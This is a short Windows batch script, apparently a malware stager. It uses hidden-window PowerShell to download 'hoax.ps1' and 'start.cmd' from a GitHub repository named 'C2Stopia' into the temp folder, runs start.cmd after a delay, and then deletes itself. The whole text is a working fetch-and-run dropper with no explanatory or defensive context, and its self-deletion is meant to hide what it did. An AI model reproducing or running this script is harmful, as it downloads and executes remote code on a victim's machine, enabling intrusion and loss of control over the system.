powershell -w h Invoke-WebRequest -Uri https://github.com/p0k0r0k0/C2Stopia/raw/main/hoax.ps1 -OutFile $env:temp/hoax.ps1
powershell -w h Invoke-WebRequest -Uri https://github.com/p0k0r0k0/C2Stopia/raw/main/start.cmd -OutFile $env:temp/start.cmd
timeout /t 10 /nobreak
start %temp%/start.cmd
del e.cmd
exit